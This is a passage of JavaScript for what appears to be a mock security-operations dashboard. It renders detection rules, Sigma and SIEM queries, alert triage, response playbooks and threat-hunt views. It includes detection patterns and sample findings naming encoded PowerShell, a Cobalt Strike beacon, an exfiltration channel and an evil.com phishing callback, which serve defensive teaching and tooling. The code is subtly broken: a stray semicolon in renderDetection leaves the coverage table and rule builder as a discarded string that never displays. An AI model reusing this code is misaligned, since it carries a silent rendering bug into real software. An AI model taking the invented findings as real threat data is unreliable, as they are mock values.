        '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff9100">' + (DETECTION_RULES.length - enabledCount) + '</div><div class="ct-stat-l">Disabled</div></div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-bottom:12px">' +
        '<div class="ct-panel-h">Detection Rules</div>' +
        '<div class="ct-panel-b" style="max-height:300px;overflow-y:auto">' +
          '<table class="ct-tbl">' +
            '<thead><tr><th>ID</th><th>Name</th><th>Type</th><th>Severity</th><th>MITRE</th><th>Source</th><th>Status</th></tr></thead>' +
            '<tbody>' +
              DETECTION_RULES.map(function(r) {
                var sevClass = r.severity==='Critical'?'ct-crit':r.severity==='High'?'ct-high':r.severity==='Medium'?'ct-med':'ct-low';
                return '<tr>' +
                  '<td style="color:var(--mut);font-size:.6rem">' + esc(r.id) + '</td>' +
                  '<td>' + esc(r.name) + '</td>' +
                  '<td><span class="ct-tag">' + esc(r.type) + '</span></td>' +
                  '<td><span class="ct-badge ' + sevClass + '">' + esc(r.severity) + '</span></td>' +
                  '<td style="color:var(--acc);font-size:.62rem">' + esc(r.mitre) + '</td>' +
                  '<td style="color:var(--mut);font-size:.62rem">' + esc(r.source) + '</td>' +
                  '<td style="color:' + (r.enabled?'#00e676':'#ff1744') + ';font-size:.62rem;font-weight:600">' + (r.enabled?'ENABLED':'DISABLED') + '</td>' +
                '</tr>';
              }).join('') +
            '</tbody>' +
          '</table>' +
        '</div>' +
      '</div>' +

      '<div class="ct-panel">' +
        '<div class="ct-panel-h">Sigma Rule Library</div>' +
        '<div class="ct-panel-b">' +
          '<div class="ct-grid2">' +
            '<div style="max-height:400px;overflow-y:auto">' +
              SIGMA_RULES.map(function(r,i) {
                var lvlClass = r.level==='critical'?'ct-crit':r.level==='high'?'ct-high':r.level==='medium'?'ct-med':'ct-low';
                return '<div class="ct-rule-card' + (selectedSigma===i?' selected':'') + '" data-sidx="' + i + '" style="margin-bottom:6px">' +
                  '<div style="display:flex;justify-content:space-between;align-items:center">' +
                    '<span style="font-size:.68rem;font-weight:600">' + esc(r.title) + '</span>' +
                    '<span class="ct-badge ' + lvlClass + '">' + esc(r.level) + '</span>' +
                  '</div>' +
                  '<div style="font-size:.58rem;color:var(--mut);margin-top:2px">' + esc(r.id) + ' | Status: ' + esc(r.status) + '</div>' +
                '</div>';
              }).join('') +
            '</div>' +
            '<div>' +
              (sigma ?
                '<div style="margin-bottom:8px">' +
                  '<div style="font-size:.72rem;font-weight:600;margin-bottom:8px">' + esc(sigma.title) + '</div>' +
                  '<div style="margin-bottom:8px">' +
                    '<div style="font-size:.6rem;color:var(--mut);text-transform:uppercase;margin-bottom:4px">Sigma YAML</div>' +
                    '<div class="ct-yaml">' + formatYaml(sigma.yaml) + '</div>' +
                  '</div>' +
                  '<div style="margin-bottom:8px">' +
                    '<div style="font-size:.6rem;color:var(--mut);text-transform:uppercase;margin-bottom:4px">Splunk SPL</div>' +
                    '<div class="ct-yaml" style="color:#00e5ff">' + esc(sigma.splunk) + '</div>' +
                  '</div>' +
                  '<div>' +
                    '<div style="font-size:.6rem;color:var(--mut);text-transform:uppercase;margin-bottom:4px">Elastic KQL</div>' +
                    '<div class="ct-yaml" style="color:#7c4dff">' + esc(sigma.kql) + '</div>' +
                  '</div>' +
                '</div>'
              :
                '<div style="text-align:center;padding:40px;color:var(--mut);font-size:.72rem">Select a Sigma rule to view its YAML, SPL, and KQL conversions</div>'
              ) +
            '</div>' +
          '</div>' +
        '</div>' +
      '</div>';

      '<div class="ct-panel" style="margin-top:12px">' +
        '<div class="ct-panel-h">Detection Coverage by MITRE Tactic</div>' +
        '<div class="ct-panel-b">' +
          '<table class="ct-tbl">' +
            '<thead><tr><th>Tactic</th><th>Rules</th><th>Coverage</th><th>Techniques Covered</th></tr></thead>' +
            '<tbody>' +
              [
                {tactic:'Initial Access',rules:3,pct:75,techniques:'T1190, T1110, T1078'},
                {tactic:'Execution',rules:4,pct:80,techniques:'T1059.001, T1218, T1047, T1053.005'},
                {tactic:'Persistence',rules:4,pct:70,techniques:'T1136.001, T1543.003, T1053.005, T1505.003'},
                {tactic:'Privilege Escalation',rules:2,pct:50,techniques:'T1068, T1611'},
                {tactic:'Defense Evasion',rules:2,pct:45,techniques:'T1070.001, T1055'},
                {tactic:'Credential Access',rules:4,pct:85,techniques:'T1003.001, T1550.002, T1558.003, T1110'},
                {tactic:'Discovery',rules:1,pct:30,techniques:'T1087.002'},
                {tactic:'Lateral Movement',rules:3,pct:65,techniques:'T1021.001, T1021.002, T1550.002'},
                {tactic:'Collection',rules:2,pct:55,techniques:'T1039, T1530'},
                {tactic:'Exfiltration',rules:2,pct:60,techniques:'T1048.001, T1048.003'},
                {tactic:'Command and Control',rules:3,pct:70,techniques:'T1071.001, T1071.004, T1568.002'},
              ].map(function(t) {
                return '<tr>' +
                  '<td style="font-weight:600">' + esc(t.tactic) + '</td>' +
                  '<td style="font-weight:600;color:var(--acc)">' + t.rules + '</td>' +
                  '<td><div class="ct-gauge" style="width:80px;display:inline-block;vertical-align:middle;margin-right:4px"><div class="ct-gauge-fill" style="width:' + t.pct + '%;background:' + (t.pct>=70?'#00e676':t.pct>=50?'#ffd600':'#ff1744') + '"></div></div><span style="font-size:.6rem">' + t.pct + '%</span></td>' +
                  '<td style="font-size:.6rem;color:var(--mut)">' + esc(t.techniques) + '</td>' +
                '</tr>';
              }).join('') +
            '</tbody>' +
          '</table>' +
        '</div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-top:12px">' +
        '<div class="ct-panel-h">Rule Builder</div>' +
        '<div class="ct-panel-b">' +
          '<div class="ct-grid2" style="margin-bottom:10px">' +
            '<div>' +
              '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Rule Name</label>' +
              '<input type="text" class="ct-inp" placeholder="My Detection Rule">' +
            '</div>' +
            '<div>' +
              '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Rule Type</label>' +
              '<select class="ct-sel" style="width:100%">' +
                '<option>Threshold</option>' +
                '<option>Pattern Match</option>' +
                '<option>Behavioral</option>' +
                '<option>Event-based</option>' +
                '<option>Statistical</option>' +
              '</select>' +
            '</div>' +
          '</div>' +
          '<div class="ct-grid3" style="margin-bottom:10px">' +
            '<div>' +
              '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Data Source</label>' +
              '<select class="ct-sel" style="width:100%">' +
                '<option>Windows Events</option>' +
                '<option>Linux Syslog</option>' +
                '<option>Firewall/IDS</option>' +
                '<option>EDR</option>' +
                '<option>DNS Logs</option>' +
                '<option>Proxy/WAF</option>' +
                '<option>Cloud Audit</option>' +
                '<option>Email Gateway</option>' +
              '</select>' +
            '</div>' +
            '<div>' +
              '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Severity</label>' +
              '<select class="ct-sel" style="width:100%">' +
                '<option>Critical</option>' +
                '<option>High</option>' +
                '<option>Medium</option>' +
                '<option>Low</option>' +
              '</select>' +
            '</div>' +
            '<div>' +
              '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">MITRE Technique</label>' +
              '<input type="text" class="ct-inp" placeholder="T1059.001">' +
            '</div>' +
          '</div>' +
          '<div style="margin-bottom:10px">' +
            '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Detection Logic</label>' +
            '<textarea class="ct-textarea" placeholder="index=windows EventCode=4688 NewProcessName=*powershell.exe* CommandLine=*-enc*\n| stats count by SubjectUserName, ComputerName\n| where count > 3" style="min-height:100px;font-family:inherit"></textarea>' +
          '</div>' +
          '<div style="margin-bottom:10px">' +
            '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Response Action</label>' +
            '<input type="text" class="ct-inp" placeholder="Alert + Isolate Host + Collect Artifacts">' +
          '</div>' +
          '<div style="display:flex;gap:8px">' +
            '<button class="ct-btn">Save Rule</button>' +
            '<button class="ct-btn ct-btn-ghost">Test Against Logs</button>' +
            '<button class="ct-btn ct-btn-ghost">Export as Sigma</button>' +
          '</div>' +
        '</div>' +
      '</div>';

    c.querySelectorAll('[data-sidx]').forEach(function(card) {
      card.onclick = function() {
        var idx = parseInt(card.dataset.sidx,10);
        selectedSigma = selectedSigma === idx ? null : idx;
        renderDetection(c);
      };
    });
  }

  function formatYaml(yaml) {
    return yaml.split('\n').map(function(line) {
      return line
        .replace(/^(\s*)([\w-]+)(:)/g, '$1<span class="kw">$2</span>$3')
        .replace(/'([^']+)'/g, '<span class="str">\'$1\'</span>')
        .replace(/: (\d+)/g, ': <span class="num">$1</span>');
    }).join('\n');
  }

  // ========== ALERT TRIAGE ==========
  function renderTriage(c) {
    var filtered = ALERTS.filter(function(a) {
      if (triageFilter.status !== 'all' && a.status !== triageFilter.status) return false;
      if (triageFilter.severity !== 'all' && a.severity !== triageFilter.severity) return false;
      return true;
    });

    var detail = selectedAlert ? ALERTS.find(function(a){return a.id===selectedAlert}) : null;

    c.innerHTML =
      '<div class="ct-filter-row" style="margin-bottom:8px">' +
        '<select class="ct-sel" id="ct-triage-status">' +
          '<option value="all">All Status</option>' +
          '<option value="New"' + (triageFilter.status==='New'?' selected':'') + '>New</option>' +
          '<option value="Investigating"' + (triageFilter.status==='Investigating'?' selected':'') + '>Investigating</option>' +
          '<option value="Escalated"' + (triageFilter.status==='Escalated'?' selected':'') + '>Escalated</option>' +
          '<option value="Resolved"' + (triageFilter.status==='Resolved'?' selected':'') + '>Resolved</option>' +
        '</select>' +
        '<select class="ct-sel" id="ct-triage-sev">' +
          '<option value="all">All Severities</option>' +
          '<option value="Critical"' + (triageFilter.severity==='Critical'?' selected':'') + '>Critical</option>' +
          '<option value="High"' + (triageFilter.severity==='High'?' selected':'') + '>High</option>' +
          '<option value="Medium"' + (triageFilter.severity==='Medium'?' selected':'') + '>Medium</option>' +
        '</select>' +
        '<span style="flex:1"></span>' +
        '<span style="color:var(--mut);font-size:.65rem">' + filtered.length + ' alerts</span>' +
      '</div>' +

      '<div class="ct-grid2">' +
        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Alert Queue</div>' +
          '<div class="ct-panel-b" style="max-height:550px;overflow-y:auto">' +
            filtered.map(function(a) {
              var sevClass = a.severity==='Critical'?'ct-crit':a.severity==='High'?'ct-high':a.severity==='Medium'?'ct-med':'ct-low';
              var statusClass = a.status==='New'?'ct-new':a.status==='Investigating'?'ct-inv':a.status==='Escalated'?'ct-esc':'ct-res';
              return '<div class="ct-rule-card' + (selectedAlert===a.id?' selected':'') + '" data-aid="' + esc(a.id) + '" style="margin-bottom:6px">' +
                '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">' +
                  '<span style="font-size:.6rem;color:var(--mut)">' + esc(a.id) + '</span>' +
                  '<div style="display:flex;gap:4px">' +
                    '<span class="ct-badge ' + sevClass + '">' + esc(a.severity) + '</span>' +
                    '<span class="ct-badge ' + statusClass + '">' + esc(a.status) + '</span>' +
                  '</div>' +
                '</div>' +
                '<div style="font-size:.72rem;font-weight:600;margin-bottom:4px">' + esc(a.title) + '</div>' +
                '<div style="display:flex;gap:8px;font-size:.58rem;color:var(--mut)">' +
                  '<span>' + new Date(a.timestamp).toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',hour12:false}) + '</span>' +
                  '<span>' + esc(a.source) + '</span>' +
                  '<span style="color:var(--acc)">' + esc(a.mitre) + '</span>' +
                  (a.analyst ? '<span>Assigned: ' + esc(a.analyst) + '</span>' : '') +
                '</div>' +
              '</div>';
            }).join('') +
          '</div>' +
        '</div>' +

        '<div>' +
          (detail ?
            '<div class="ct-panel">' +
              '<div class="ct-panel-h">Alert Detail - ' + esc(detail.id) + '</div>' +
              '<div class="ct-panel-b">' +
                '<div style="margin-bottom:12px">' +
                  '<h3 style="font-size:.85rem;margin:0 0 4px">' + esc(detail.title) + '</h3>' +
                  '<div style="display:flex;gap:6px;margin-bottom:8px">' +
                    '<span class="ct-badge ' + (detail.severity==='Critical'?'ct-crit':detail.severity==='High'?'ct-high':'ct-med') + '">' + esc(detail.severity) + '</span>' +
                    '<span class="ct-badge ' + (detail.status==='New'?'ct-new':detail.status==='Investigating'?'ct-inv':detail.status==='Escalated'?'ct-esc':'ct-res') + '">' + esc(detail.status) + '</span>' +
                  '</div>' +
                '</div>' +

                '<div class="ct-grid2" style="margin-bottom:12px">' +
                  '<div class="ct-stat"><div class="ct-stat-l">Source IP</div><div style="font-size:.72rem;font-weight:600;margin-top:2px">' + esc(detail.srcIp||'N/A') + '</div></div>' +
                  '<div class="ct-stat"><div class="ct-stat-l">Destination</div><div style="font-size:.72rem;font-weight:600;margin-top:2px">' + esc(detail.dstIp||'N/A') + '</div></div>' +
                  '<div class="ct-stat"><div class="ct-stat-l">Rule</div><div style="font-size:.72rem;font-weight:600;margin-top:2px">' + esc(detail.rule) + '</div></div>' +
                  '<div class="ct-stat"><div class="ct-stat-l">MITRE ATT&CK</div><div style="font-size:.72rem;font-weight:600;margin-top:2px;color:var(--acc)">' + esc(detail.mitre) + '</div></div>' +
                  '<div class="ct-stat"><div class="ct-stat-l">Event Count</div><div style="font-size:.72rem;font-weight:600;margin-top:2px">' + detail.count + '</div></div>' +
                  '<div class="ct-stat"><div class="ct-stat-l">Data Source</div><div style="font-size:.72rem;font-weight:600;margin-top:2px">' + esc(detail.source) + '</div></div>' +
                '</div>' +

                '<div style="margin-bottom:12px">' +
                  '<div style="font-size:.62rem;color:var(--mut);text-transform:uppercase;margin-bottom:6px">Investigation Timeline</div>' +
                  '<div class="ct-timeline">' +
                    '<div class="ct-tl-item">' +
                      '<div class="ct-tl-time">' + new Date(detail.timestamp).toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false}) + '</div>' +
                      '<div>Alert triggered by ' + esc(detail.source) + ' rule: ' + esc(detail.rule) + '</div>' +
                    '</div>' +
                    (detail.status !== 'New' ?
                      '<div class="ct-tl-item">' +
                        '<div class="ct-tl-time">' + new Date(new Date(detail.timestamp).getTime()+120000).toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false}) + '</div>' +
                        '<div>Assigned to ' + esc(detail.analyst||'Analyst') + ' for investigation</div>' +
                      '</div>'
                    : '') +
                    (detail.status === 'Escalated' ?
                      '<div class="ct-tl-item">' +
                        '<div class="ct-tl-time">' + new Date(new Date(detail.timestamp).getTime()+300000).toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false}) + '</div>' +
                        '<div style="color:#ff1744">Escalated to Tier 2 / Incident Response Team</div>' +
                      '</div>'
                    : '') +
                  '</div>' +
                '</div>' +

                '<div style="margin-bottom:12px">' +
                  '<div style="font-size:.62rem;color:var(--mut);text-transform:uppercase;margin-bottom:6px">Evidence</div>' +
                  '<div style="display:flex;gap:4px;flex-wrap:wrap;margin-bottom:8px">' +
                    (detail.srcIp ? '<span class="ct-tag">SRC: ' + esc(detail.srcIp) + '</span>' : '') +
                    (detail.dstIp ? '<span class="ct-tag">DST: ' + esc(detail.dstIp) + '</span>' : '') +
                    '<span class="ct-tag" style="background:rgba(255,23,68,.1);color:#ff1744;border-color:rgba(255,23,68,.2)">MITRE: ' + esc(detail.mitre) + '</span>' +
                    '<span class="ct-tag">' + esc(detail.source) + '</span>' +
                  '</div>' +
                '</div>' +

                '<div style="margin-bottom:12px">' +
                  '<div style="font-size:.62rem;color:var(--mut);text-transform:uppercase;margin-bottom:6px">Related Alerts</div>' +
                  (function() {
                    var related = ALERTS.filter(function(a2) {
                      return a2.id !== detail.id && (a2.srcIp === detail.srcIp || a2.dstIp === detail.dstIp || a2.mitre === detail.mitre);
                    }).slice(0,5);
                    if (related.length === 0) return '<div style="font-size:.65rem;color:var(--mut)">No related alerts found</div>';
                    return related.map(function(r) {
                      return '<div style="display:flex;gap:6px;align-items:center;font-size:.62rem;padding:3px 0;border-bottom:1px solid var(--line)">' +
                        '<span style="color:var(--mut);min-width:50px">' + esc(r.id) + '</span>' +
                        '<span class="ct-badge ' + (r.severity==='Critical'?'ct-crit':r.severity==='High'?'ct-high':'ct-med') + '" style="font-size:.5rem">' + esc(r.severity) + '</span>' +
                        '<span style="flex:1">' + esc(r.title) + '</span>' +
                        '<span style="color:var(--acc)">' + esc(r.mitre) + '</span>' +
                      '</div>';
                    }).join('');
                  })() +
                '</div>' +

                '<div style="margin-bottom:12px">' +
                  '<div style="font-size:.62rem;color:var(--mut);text-transform:uppercase;margin-bottom:6px">Analyst Notes</div>' +
                  '<textarea class="ct-textarea" placeholder="Add investigation notes..."></textarea>' +
                '</div>' +

                '<div style="display:flex;gap:6px;flex-wrap:wrap">' +
                  '<button class="ct-btn ct-btn-sm" data-action="assign">Assign</button>' +
                  '<button class="ct-btn ct-btn-sm" data-action="investigate">Investigate</button>' +
                  '<button class="ct-btn ct-btn-sm ct-btn-danger" data-action="escalate">Escalate</button>' +
                  '<button class="ct-btn ct-btn-sm ct-btn-ghost" data-action="fp">Close as FP</button>' +
                  '<button class="ct-btn ct-btn-sm" style="border-color:#00e676;color:#00e676" data-action="resolve">Resolve</button>' +
                  '<button class="ct-btn ct-btn-sm ct-btn-ghost">Export PDF</button>' +
                '</div>' +
              '</div>' +
            '</div>' +

            (function() {
              var matchedPlaybooks = PLAYBOOKS.filter(function(pb) {
                return pb.mitre === detail.mitre || (
                  (detail.mitre === 'T1110.001' && pb.mitre === 'T1110') ||
                  (detail.mitre === 'T1059.001' && pb.mitre === 'T1059') ||
                  (detail.mitre === 'T1071.001' && pb.mitre === 'T1059') ||
                  (detail.mitre === 'T1078.004' && pb.mitre === 'T1078.004') ||
                  (detail.mitre === 'T1486' && pb.mitre === 'T1486') ||
                  (detail.mitre === 'T1566.002' && pb.mitre === 'T1566') ||
                  (detail.mitre === 'T1048' && pb.mitre === 'T1048') ||
                  (detail.mitre === 'T1003.001' && pb.mitre === 'T1059') ||
                  (detail.mitre === 'T1098' && pb.mitre === 'T1078.004')
                );
              });
              if (matchedPlaybooks.length === 0) return '';
              return matchedPlaybooks.map(function(pb) {
                return '<div class="ct-panel" style="margin-top:8px">' +
                  '<div class="ct-panel-h" style="color:#00e5ff">Recommended Playbook: ' + esc(pb.name) + '</div>' +
                  '<div class="ct-panel-b">' +
                    '<div style="display:flex;gap:6px;margin-bottom:8px">' +
                      '<span class="ct-badge ' + (pb.severity==='Critical'?'ct-crit':'ct-high') + '">' + esc(pb.severity) + '</span>' +
                      '<span class="ct-tag">' + esc(pb.mitre) + '</span>' +
                      '<span style="font-size:.6rem;color:var(--mut)">' + pb.steps.length + ' steps | ' + pb.steps.filter(function(s){return s.automated}).length + ' automated</span>' +
                    '</div>' +
                    pb.steps.map(function(step) {
                      return '<div style="display:flex;gap:8px;align-items:flex-start;padding:4px 0;border-bottom:1px solid var(--line);font-size:.62rem">' +
                        '<span style="width:18px;height:18px;border-radius:50%;background:rgba(0,229,255,.1);border:1px solid rgba(0,229,255,.3);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:.55rem;font-weight:600;color:var(--acc)">' + step.order + '</span>' +
                        '<div style="flex:1">' +
                          '<div style="font-weight:600">' + esc(step.action) + '</div>' +
                          '<div style="color:var(--mut);font-size:.58rem">' + esc(step.detail) + '</div>' +
                        '</div>' +
                        (step.automated ? '<span class="ct-tag" style="background:rgba(0,230,118,.1);color:#00e676;border-color:rgba(0,230,118,.2)">AUTO</span>' : '<span class="ct-tag" style="background:rgba(255,145,0,.1);color:#ff9100;border-color:rgba(255,145,0,.2)">MANUAL</span>') +
                      '</div>';
                    }).join('') +
                    '<div style="display:flex;gap:6px;margin-top:8px">' +
                      '<button class="ct-btn ct-btn-sm">Execute Automated Steps</button>' +
                      '<button class="ct-btn ct-btn-sm ct-btn-ghost">View Full Playbook</button>' +
                    '</div>' +
                  '</div>' +
                '</div>';
              }).join('');
            })()
          :
            '<div class="ct-panel"><div class="ct-panel-b" style="text-align:center;padding:40px;color:var(--mut);font-size:.72rem">Select an alert to view details and triage</div></div>'
          ) +
        '</div>' +
      '</div>';

    c.querySelector('#ct-triage-status').onchange = function(e) {
      triageFilter.status = e.target.value; renderTriage(c);
    };
    c.querySelector('#ct-triage-sev').onchange = function(e) {
      triageFilter.severity = e.target.value; renderTriage(c);
    };
    c.querySelectorAll('[data-aid]').forEach(function(card) {
      card.onclick = function() {
        selectedAlert = card.dataset.aid === selectedAlert ? null : card.dataset.aid;
        renderTriage(c);
      };
    });
    c.querySelectorAll('[data-action]').forEach(function(btn) {
      btn.onclick = function(e) {
        e.stopPropagation();
        var a = ALERTS.find(function(x){return x.id===selectedAlert});
        if (!a) return;
        var act = btn.dataset.action;
        if (act==='assign') { a.analyst = a.analyst || 'Analyst-1'; a.status = 'Investigating'; }
        else if (act==='investigate') { a.status = 'Investigating'; a.analyst = a.analyst || 'Analyst-1'; }
        else if (act==='escalate') { a.status = 'Escalated'; }
        else if (act==='fp') { a.status = 'Resolved'; }
        else if (act==='resolve') { a.status = 'Resolved'; }
        renderTriage(c);
      };
    });
  }

  // ========== THREAT HUNT ==========
  function renderHunt(c) {
    var filtered = HUNT_HYPOTHESES.filter(function(h) {
      if (huntFilter === 'all') return true;
      return h.status === huntFilter;
    });

    c.innerHTML =
      '<div class="ct-grid4" style="margin-bottom:12px">' +
        '<div class="ct-stat"><div class="ct-stat-v">' + HUNT_HYPOTHESES.length + '</div><div class="ct-stat-l">Hypotheses</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e676">' + HUNT_HYPOTHESES.filter(function(h){return h.status==='active'}).length + '</div><div class="ct-stat-l">Active Hunts</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff9100">' + HUNT_HYPOTHESES.reduce(function(s,h){return s+h.findings},0) + '</div><div class="ct-stat-l">Findings</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:var(--mut)">' + HUNT_HYPOTHESES.filter(function(h){return h.status==='open'}).length + '</div><div class="ct-stat-l">Pending</div></div>' +
      '</div>' +

      '<div class="ct-filter-row" style="margin-bottom:8px">' +
        '<button class="ct-btn ct-btn-sm' + (huntFilter==='all'?' ':' ct-btn-ghost ') + '" data-hf="all">All</button>' +
        '<button class="ct-btn ct-btn-sm' + (huntFilter==='active'?' ':' ct-btn-ghost ') + '" data-hf="active">Active</button>' +
        '<button class="ct-btn ct-btn-sm' + (huntFilter==='open'?' ':' ct-btn-ghost ') + '" data-hf="open">Open</button>' +
        '<button class="ct-btn ct-btn-sm' + (huntFilter==='completed'?' ':' ct-btn-ghost ') + '" data-hf="completed">Completed</button>' +
      '</div>' +

      '<div>' +
        filtered.map(function(h) {
          var statusColor = h.status==='active'?'#00e676':h.status==='open'?'#ffd600':'var(--mut)';
          return '<div class="ct-panel" style="margin-bottom:8px">' +
            '<div class="ct-panel-h">' +
              '<span style="flex:1">' + esc(h.id) + ' - ' + esc(h.name) + '</span>' +
              '<span class="ct-badge" style="color:' + statusColor + ';border-color:' + statusColor + '">' + esc(h.status) + '</span>' +
              (h.findings > 0 ? '<span class="ct-badge ct-high">' + h.findings + ' findings</span>' : '') +
              '<span class="ct-tag">' + esc(h.mitre) + '</span>' +
            '</div>' +
            '<div class="ct-panel-b">' +
              '<div style="margin-bottom:8px">' +
                '<div style="font-size:.62rem;color:var(--mut);text-transform:uppercase;margin-bottom:2px">Hypothesis</div>' +
                '<div style="font-size:.72rem">' + esc(h.hypothesis) + '</div>' +
              '</div>' +
              '<div style="margin-bottom:8px">' +
                '<div style="font-size:.62rem;color:var(--mut);text-transform:uppercase;margin-bottom:2px">Data Source</div>' +
                '<div style="font-size:.68rem;color:var(--acc)">' + esc(h.datasource) + '</div>' +
              '</div>' +
              '<div style="margin-bottom:8px">' +
                '<div style="font-size:.62rem;color:var(--mut);text-transform:uppercase;margin-bottom:2px">Hunt Query</div>' +
                '<div class="ct-yaml">' + esc(h.query) + '</div>' +
              '</div>' +
              '<div style="display:flex;gap:6px">' +
                '<button class="ct-btn ct-btn-sm">Run Query</button>' +
                '<button class="ct-btn ct-btn-sm ct-btn-ghost">Add Finding</button>' +
                '<button class="ct-btn ct-btn-sm ct-btn-ghost">Export</button>' +
              '</div>' +
              (h.status === 'active' && h.findings > 0 ?
                '<div style="margin-top:10px;padding-top:10px;border-top:1px solid var(--line)">' +
                  '<div style="font-size:.62rem;color:var(--mut);text-transform:uppercase;margin-bottom:6px">Hunt Findings</div>' +
                  (h.id === 'HH-003' ?
                    '<div>' +
                      [
                        {host:'10.0.2.100',dest:'45.33.32.156:443',interval:'60s +/- 5s',jitter:'8.3%',confidence:'97%',verdict:'Cobalt Strike Beacon'},
                        {host:'10.0.2.100',dest:'198.51.100.50:443',interval:'300s +/- 15s',jitter:'5.0%',confidence:'89%',verdict:'Data Exfil Channel'},
                        {host:'10.0.3.75',dest:'login-microsoft365.evil.com:443',interval:'3600s +/- 120s',jitter:'3.3%',confidence:'72%',verdict:'Phishing Callback'},
                      ].map(function(f) {
                        return '<div style="display:flex;gap:8px;align-items:center;padding:4px 0;border-bottom:1px solid var(--line);font-size:.62rem">' +
                          '<span style="color:var(--acc);min-width:80px">' + esc(f.host) + '</span>' +
                          '<span style="min-width:150px">' + esc(f.dest) + '</span>' +
                          '<span style="min-width:80px">Interval: ' + esc(f.interval) + '</span>' +
                          '<span style="min-width:60px">Jitter: ' + esc(f.jitter) + '</span>' +
                          '<span style="min-width:60px;color:#00e676">Conf: ' + esc(f.confidence) + '</span>' +
                          '<span style="color:#ff1744;font-weight:600">' + esc(f.verdict) + '</span>' +
                        '</div>';
                      }).join('') +
                    '</div>'
                  : h.id === 'HH-005' ?
                    '<div>' +
                      [
                        {account:'svc-admin',logonType:'Interactive (Type 2)',src:'10.0.2.100',normal:'Network only',risk:'High'},
                        {account:'svc-backup',logonType:'RDP (Type 10)',src:'10.0.2.100',normal:'Scheduled task only',risk:'Critical'},
                      ].map(function(f) {
                        return '<div style="display:flex;gap:8px;align-items:center;padding:4px 0;border-bottom:1px solid var(--line);font-size:.62rem">' +
                          '<span style="color:var(--acc);min-width:80px">' + esc(f.account) + '</span>' +
                          '<span style="min-width:120px">' + esc(f.logonType) + '</span>' +
                          '<span style="min-width:80px">From: ' + esc(f.src) + '</span>' +
                          '<span style="min-width:120px;color:var(--mut)">Normal: ' + esc(f.normal) + '</span>' +
                          '<span class="ct-badge ' + (f.risk==='Critical'?'ct-crit':'ct-high') + '">' + esc(f.risk) + '</span>' +
                        '</div>';
                      }).join('') +
                    '</div>'
                  : h.id === 'HH-007' ?
                    '<div style="display:flex;gap:8px;align-items:center;padding:4px 0;font-size:.62rem">' +
                      '<span style="color:var(--acc)">\\Microsoft\\Windows\\UpdateCheck</span>' +
                      '<span style="color:var(--mut)">Path: C:\\Windows\\Temp\\beacon.exe</span>' +
                      '<span class="ct-badge ct-crit">Critical</span>' +
                    '</div>'
                  : '') +
                '</div>'
              : '') +
            '</div>' +
          '</div>';
        }).join('') +
      '</div>' +

      '<div class="ct-panel" style="margin-top:12px">' +
        '<div class="ct-panel-h">Hunt Methodology</div>' +
        '<div class="ct-panel-b">' +
          '<div class="ct-grid3">' +
            [
              {phase:'1. Hypothesize',desc:'Form a hypothesis based on threat intel, recent incidents, or MITRE ATT&CK gaps. Define what adversary behavior you expect to find.',color:'#00e5ff'},
              {phase:'2. Investigate',desc:'Write and run queries against available data sources. Correlate findings across log types. Document anomalies and patterns.',color:'#ff9100'},
              {phase:'3. Resolve',desc:'Determine if findings are true positives. Create detection rules for confirmed threats. Update playbooks and document lessons learned.',color:'#00e676'},
            ].map(function(p) {
              return '<div class="ct-stat" style="border-left:3px solid ' + p.color + '">' +
                '<div style="font-size:.72rem;font-weight:600;color:' + p.color + ';margin-bottom:4px">' + esc(p.phase) + '</div>' +
                '<div style="font-size:.62rem;color:var(--mut)">' + esc(p.desc) + '</div>' +
              '</div>';
            }).join('') +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-top:12px">' +
        '<div class="ct-panel-h">New Hunt Hypothesis</div>' +
        '<div class="ct-panel-b">' +
          '<div class="ct-grid2" style="margin-bottom:10px">' +
            '<div>' +
              '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Hypothesis Name</label>' +
              '<input type="text" class="ct-inp" placeholder="e.g., DLL Sideloading via Signed Binaries">' +
            '</div>' +
            '<div>' +
              '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">MITRE Technique</label>' +
              '<input type="text" class="ct-inp" placeholder="e.g., T1574.002">' +
            '</div>' +
          '</div>' +
          '<div style="margin-bottom:10px">' +
            '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Hypothesis Statement</label>' +
            '<textarea class="ct-textarea" placeholder="Describe what adversary behavior you expect to find and why..."></textarea>' +
          '</div>' +
          '<div class="ct-grid2" style="margin-bottom:10px">' +
            '<div>' +
              '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Data Source</label>' +
              '<select class="ct-sel" style="width:100%">' +
                '<option>Windows Process Creation (4688)</option>' +
                '<option>Windows Logon Events (4624/4625)</option>' +
                '<option>Sysmon Events</option>' +
                '<option>DNS Query Logs</option>' +
                '<option>Firewall/Proxy Logs</option>' +
                '<option>EDR Telemetry</option>' +
                '<option>Authentication Logs</option>' +
                '<option>Network Flow Data</option>' +
                '<option>Active Directory</option>' +
                '<option>Cloud Audit Logs</option>' +
              '</select>' +
            '</div>' +
            '<div>' +
